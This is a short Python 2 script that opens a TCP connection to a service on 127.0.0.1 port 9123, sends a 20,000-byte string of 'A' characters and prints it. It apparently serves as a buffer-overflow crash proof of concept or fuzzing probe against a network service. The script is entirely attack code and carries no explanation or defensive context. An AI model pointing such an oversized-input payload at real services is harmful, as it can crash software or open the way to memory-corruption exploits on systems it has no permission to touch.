import socket
ip = "127.0.0.1"
port = 9123
remotecode = "A" * 20000
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect((ip ,port))
s.send(remotecode)

print remotecode
